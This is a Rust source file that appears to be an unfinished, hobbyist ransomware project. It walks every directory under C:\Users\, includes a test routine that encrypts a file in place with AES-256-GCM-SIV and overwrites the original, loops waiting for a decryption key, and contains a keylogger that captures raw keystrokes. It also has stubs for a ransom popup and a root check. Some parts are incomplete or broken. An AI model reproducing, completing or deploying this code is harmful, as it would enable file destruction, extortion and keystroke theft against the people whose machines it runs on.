#![allow(warnings)]
#[allow(dead_code)]
use aes_gcm_siv::aead::generic_array::GenericArray;
use aes_gcm_siv::aead::Aead;
use aes_gcm_siv::{Aes256GcmSiv, KeyInit, Nonce};
use crossterm::event::{poll, read, Event, KeyCode};
use crossterm::terminal::enable_raw_mode;
use dioxus::prelude::*;
use dioxus_desktop;
use rand_chacha::rand_core::{RngCore, SeedableRng};
use rand_chacha::ChaCha20Rng;
use std::fs::File;
use std::io::{Read, Write};
use std::process::Command;
use std::{io, path::Path};
use walkdir::{DirEntry, Error, WalkDir};
//TODO: check the speed of this later
//TODO: gonna need to add more later,

fn main() {
    // create a popup on windows systems

    let cmd = Command::new("cmd")
        .arg("/C")
        .arg("start cmd /K echo hello am virus")
        .spawn()
        .expect("ruh roh");

    // test_encryptfile();
    traverse();
}

/**
 * check if the required resources are installed.
 * if not, install them
 */
fn check_requirements() {
    let cmd = Command::new("sh")
        .arg("-c")
        .arg("zenity")
        .output()
        .expect("zenity not installed");

    if !cmd.status.success() {
        //TODO: add more prints here later maybe for useability or maybe not
        //install zenity
        //
        println!("installing zenity");
        let install_cmd: std::process::Output = Command::new("sh")
            .arg("-c")
            .arg("sudo apt-get install zenity")
            .output()
            .expect("failed to install zenity");
    }
}

fn display_message() {
    //popup WITH THE DECRYPTION KEY ON THE POPUP
    //
}

/**
 * This is a test function to make sure the encryption is working
 *
 * only encrypts the files on the desktop. used for testing so i dont break anything accidentally
 */
fn test_encryptfile() {
    //the file in the windows vm is called restored
    let mut testfile = File::open("restored").expect("can't open file o no");
    let mut buffer = Vec::new();
    testfile
        .read_to_end(&mut buffer)
        .expect("can't load file contents");

    //call the generate key function
    let mut rng = ChaCha20Rng::from_entropy();
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
    let nonce = Nonce::from_slice(&nonce_array);

    //FIXME: up to here. making the nonce
    let key = Aes256GcmSiv::generate_key(rng);
    let cipher = Aes256GcmSiv::new(&key);

    let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
    //put the ciphertext back in the file

    testfile.set_len(0);
    testfile.write_all(&ciphertext.unwrap().as_slice()); //tvector -> slice
                                                         //why this no work tho

    //print the key and nonce TODO: check if :? is alg or display
    println!("key: {:?}", key);

    //TODO: !!!!! read the contents of the file!
    //this will be in the completed code but not in this test function because im lazy

    loop {
        //delay and wait for user to enter the decryption key
        //TODO: print the key needed for decryption
        let mut user_input = String::new();
        println!("Enter decryption key pls: ");
        io::stdin().read_line(&mut user_input).unwrap();
        let user_input_bytes = user_input.as_bytes(); //convert to bytes

        //TODO: UP TO HERE TODAY
        //key length 32, nonce length 12
        if user_input_bytes.len() != 32 {
            //print error
            println!("Invalid key length")
        } else {
            // //FIXME: convert byte array into key format why this no work
            // //WHY THIS NO WORK
            // let user_key = GenericArray::clone_from_slice(&user_input_bytes[0..32]);
            // //decrypt using the key
            // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
        }
        //convert to key
    }
    //TODO: put user input into the correct variable type
    //try decrypting with this key, print if it works or not
}

/**
 * TODO: the initialization code for the cipher is here atm
 * idk if ill move it later
 *
 * Use AES-256
 *
 * Same key for all files, different nonce for each file
 *
 * Notes: nonce is to make sure 2 identical plaintexts produce different output
 * counter is to make sure 2 identical blocks within the same plaintext produce different output
 *
 * Returns the cipher object
 */
fn init_cipher() -> Aes256GcmSiv {
    let mut rng = ChaCha20Rng::from_entropy();
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
    let nonce = Nonce::from_slice(&nonce_array);

    //FIXME: up to here. making the nonce
    let key = Aes256GcmSiv::generate_key(rng);
    Aes256GcmSiv::new(&key)
}

/**
 * find all the files in subdirectories.
 * follow symlinks, don't skip hidden files
 *
 * FIXME: this will probably mess up some system files, fix later
 */
fn traverse() -> Result<(), Error> {
    //return result
    //search recursively through all directories and find files
    let mut file = File::create("C:\\Users\\win11\\Desktop\\output.txt");

    for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
        match entry {
            Ok(entry) => {
                writeln!(
                    //this is just debug code
                    file.as_ref().unwrap(),
                    "found file: {}",
                    entry.path().display()
                );
                encrypt(entry.path());
            }
            Err(e) => {
                writeln!(file.as_ref().unwrap(), "Error: {}", e);
            }
        }
    }
    Ok(())
}

/**
 * Encrypt a given file
 */
fn encrypt(path: &Path) {
    let mut file = File::open(path).expect("can't open file");
}

/**
 * file encryption done with aes gcm
 */
// fn encrypt(file_path: &Path, encryption_key: ) {//get a reference of the path
//     //decide which encryption scheme to use. SAME KEy
// }

fn decrypt() {
    //
}

fn keylogger() {
    //killswitch if user types please
    //
    // let cmd = Command::new("cmd.exe")
    //     .arg("/K")
    //     .arg("echo keylogger started \n")
    //     .spawn()
    //     .expect("failed to start keylogger");
    enable_raw_mode();
    println!("weewoo");

    loop {
        //match case for different keys pressed

        match read().unwrap() {
            //read any event
            Event::Key(event) => match event.code {
                KeyCode::Char(character) => {
                    println!("pressed: {}", character);

                    // let cmd = Command::new("cmd.exe")
                    //     .arg("/K")
                    //     .arg(format!("print {} \n", character))
                    //     .spawn()
                    //     .expect("failed to start keylogger");
                }
                _ => {}
            },
            _ => {}
        }
    }
}

//TODO: is this even necessary with windows?
fn root_check() { //
                  //if we dont have root. give popup: "may i plz have root 🥺👉🏽👈🏽"
}
